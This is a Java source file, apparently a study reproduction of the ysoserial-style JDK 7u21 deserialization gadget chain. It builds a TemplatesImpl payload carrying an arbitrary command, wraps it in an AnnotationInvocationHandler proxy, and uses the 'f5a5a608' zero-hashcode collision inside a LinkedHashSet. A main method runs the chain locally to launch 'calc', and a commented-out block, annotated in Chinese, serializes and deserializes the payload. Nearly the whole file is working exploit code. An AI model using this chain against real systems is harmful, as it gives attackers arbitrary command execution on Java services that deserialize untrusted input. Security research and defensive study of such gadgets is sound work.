
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.LinkedHashSet;

public class jdk7u21 {

    public static Object getObject(final String command) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(command);

        String zeroHashCodeStr = "f5a5a608";

        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, "foo");

        InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
        Reflections.setFieldValue(tempHandler, "type", Templates.class);
        Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);

        LinkedHashSet set = new LinkedHashSet(); // maintain order
        set.add(templates);
        set.add(proxy);

        Reflections.setFieldValue(templates, "_auxClasses", null);
        Reflections.setFieldValue(templates, "_class", null);

        map.put(zeroHashCodeStr, templates); // swap in real object

        return set;
    }

    public static void main(String[] args) throws Exception {
        final TemplatesImpl templates = new TemplatesImpl();

        TemplatesImpl calc = (TemplatesImpl) Gadgets.createTemplatesImpl("calc");
        calc.getOutputProperties();
    }
//        public static void main(String[] args) throws Exception {
//            Object calc = getObject("calc");
//
//            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();//用于存放person对象序列化byte数组的输出流
//
//            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
//            objectOutputStream.writeObject(calc);//序列化对象
//            objectOutputStream.flush();
//            objectOutputStream.close();
//
//            byte[] bytes = byteArrayOutputStream.toByteArray(); //读取序列化后的对象byte数组
//
//            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);//存放byte数组的输入流
//
//            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
//            Object o = objectInputStream.readObject();
//
//    }
}
